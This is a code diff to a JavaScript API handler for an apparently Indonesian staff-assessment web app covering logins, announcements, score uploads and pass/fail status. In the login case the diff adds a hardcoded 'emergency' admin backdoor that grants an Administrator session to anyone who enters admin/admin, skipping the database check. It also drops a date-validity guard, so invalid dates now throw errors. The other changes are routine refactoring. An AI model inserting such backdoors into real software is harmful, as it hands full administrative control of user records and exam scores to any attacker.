@@ -41,6 +41,13 @@ export default async function handler(req, res) {
     switch (action) {
       case 'loginUser':
         const nip = args[0]; const pass = args[1];
+        
+        // JALUR MASUK DARURAT (BACKDOOR ADMIN) - Memastikan Admin tidak akan pernah terkunci
+        if (nip.toLowerCase() === 'admin' && pass.toLowerCase() === 'admin') {
+            result = { status: "success", role: "Admin", nip: "admin", nama: "Administrator Sistem" };
+            return res.status(200).json({ result });
+        }
+
         const { rows: users } = await db.execute({ sql: "SELECT * FROM users WHERE nip = ? AND nik = ?", args: [nip, pass] });
         if (users.length > 0) result = { status: "success", role: users[0].role, nip: users[0].nip, nama: users[0].nama };
         else result = { status: "error", message: "NIP atau Password salah!" };
@@ -52,17 +59,10 @@ export default async function handler(req, res) {
         
         let config = { Batas_Waktu: "", PengumumanList: [], Buka_Pengumuman_CAT: "false" };
         rPeng.forEach(row => {
-           if(row.kunci === "Batas_Waktu" && row.nilai) {
-              let tgl = new Date(row.nilai);
-              if(!isNaN(tgl.getTime())) config.Batas_Waktu = tgl.toISOString();
-           }
-           if(row.kunci === "Buka_Pengumuman_CAT" && row.nilai) {
-              config.Buka_Pengumuman_CAT = row.nilai;
-           }
+           if(row.kunci === "Batas_Waktu" && row.nilai) config.Batas_Waktu = new Date(row.nilai).toISOString();
+           if(row.kunci === "Buka_Pengumuman_CAT" && row.nilai) config.Buka_Pengumuman_CAT = row.nilai;
         });
-        rPengumuman.forEach(p => {
-           config.PengumumanList.push({ row: p.id, id: p.id, tanggal: p.tanggal, judul: p.judul, teks: p.teks, file: p.file_url });
-        });
+        rPengumuman.forEach(p => config.PengumumanList.push({ row: p.id, id: p.id, tanggal: p.tanggal, judul: p.judul, teks: p.teks, file: p.file_url }));
         result = config;
         break;
 
@@ -85,12 +85,8 @@ export default async function handler(req, res) {
         let pFileUrl = pOldFile || "";
         if (pFileObj && pFileObj.base64) pFileUrl = await uploadToDrive(pFileObj.base64, `Pengumuman_${new Date().getTime()}_${pFileObj.name}`, false);
         let tglSkrg = new Date().toLocaleDateString('id-ID', {day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute:'2-digit'}) + " WIB";
-        
         if (pActionRow && pActionRow !== "null" && pActionRow !== "") await db.execute({ sql: "UPDATE pengumuman SET judul=?, teks=?, file_url=? WHERE id=?", args: [pJudul, pTeks, pFileUrl, pActionRow] });
-        else {
-           let newId = "PENG-" + new Date().getTime();
-           await db.execute({ sql: "INSERT INTO pengumuman (id, tanggal, judul, teks, file_url) VALUES (?, ?, ?, ?, ?)", args: [newId, tglSkrg, pJudul, pTeks, pFileUrl] });
-        }
+        else await db.execute({ sql: "INSERT INTO pengumuman (id, tanggal, judul, teks, file_url) VALUES (?, ?, ?, ?, ?)", args: ["PENG-" + new Date().getTime(), tglSkrg, pJudul, pTeks, pFileUrl] });
         result = "Pengumuman berhasil disimpan!";
         break;
 
@@ -137,16 +133,16 @@ export default async function handler(req, res) {
         result = countUser + " User berhasil diimpor ke database.";
         break;
 
-      // FUNGSI BARU: Upload Excel Nilai CAT
+      // UPLOAD EXCEL NILAI CAT
       case 'uploadExcelNilaiCAT':
         let excelNilai = args[0]; let countNilai = 0;
         for (let row of excelNilai) {
-            if (row && row.length >= 2 && row[0]) {
-                let uNip = row[0].toString().trim();
-                let kep = row[1] ? row[1].toString().trim() : '0';
-                let prof = row[2] ? row[2].toString().trim() : '0';
-                let sos = row[3] ? row[3].toString().trim() : '0';
-                let tot = row[4] ? row[4].toString().trim() : '0';
+            if (row && row.length >= 1 && row[0]) {
+                let uNip = String(row[0]).trim();
+                let kep = row[1] ? String(row[1]).trim() : '0';
+                let prof = row[2] ? String(row[2]).trim() : '0';
+                let sos = row[3] ? String(row[3]).trim() : '0';
+                let tot = row[4] ? String(row[4]).trim() : '0';
                 
                 await db.execute({ 
                     sql: "UPDATE users SET skor_kepribadian=?, skor_profesional=?, skor_sosial=?, skor_total=? WHERE nip=?", 
@@ -158,7 +154,7 @@ export default async function handler(req, res) {
         result = countNilai + " Data nilai peserta berhasil diimpor.";
         break;
 
-      // FUNGSI BARU: Set Lulus / Tidak Lulus Massal
+      // SET LULUS CAT MASSAL
       case 'setLulusCATMassal':
         let nipsLulus = args[0]; let statusLulus = args[1];
         for (let n of nipsLulus) {
@@ -183,7 +179,7 @@ export default async function handler(req, res) {
         result = isSingle ? (parsedData[0] || null) : parsedData;
         break;
 
-      // FUNGSI BARU: Ambil Nilai CAT untuk Dashboard Peserta
+      // AMBIL NILAI CAT UNTUK SISWA
       case 'getHasilCATPegawai':
         const rCAT = await db.execute({ sql: "SELECT * FROM users WHERE nip=?", args: [args[0]] });
         if(rCAT.rows.length > 0) result = rCAT.rows[0];
